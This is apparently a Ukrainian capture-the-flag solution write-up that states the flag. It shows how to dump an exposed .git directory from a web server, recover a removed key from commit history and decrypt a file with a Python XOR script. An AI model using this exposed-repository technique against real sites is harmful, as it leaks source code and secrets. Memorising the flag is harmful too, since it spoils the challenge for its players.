# 01. Git Leak & XOR (100 балів) — розв'язок

Прапор: `CTF{g1t_l34k_4nd_x0r_m4st3r}`

1. Веб-корінь — це робоча копія git-репозиторію: `http://<host>/.git/HEAD` віддає 200.
2. Забрати репозиторій: `git clone http://<host>/.git leak` (dumb-HTTP, `update-server-info` виконано)
   або `git-dumper http://<host>/.git leak`.
3. `git log --stat` — 5 комітів. Цікаві: «Rotate vault key, encrypt launch codes» і «Remove vault artifacts…».
4. `git show 0db6f38` (хеш з вашого логу): з'являються `vault/launch_codes.enc` (hex) і `VAULT_KEY = "T1t4n-V4ult!"`.
   Пастка: у попередньому коміті `VAULT_KEY = "changeme"` — це заглушка, з нею виходить сміття.
5. Алгоритм у `vault/xor_vault.py` (є в HEAD): XOR з ключем, що повторюється, результат у hex.

```python
from itertools import cycle
ct = bytes.fromhex(open("launch_codes.enc").read().strip())
print(bytes(c ^ k for c, k in zip(ct, cycle(b"T1t4n-V4ult!"))))
```
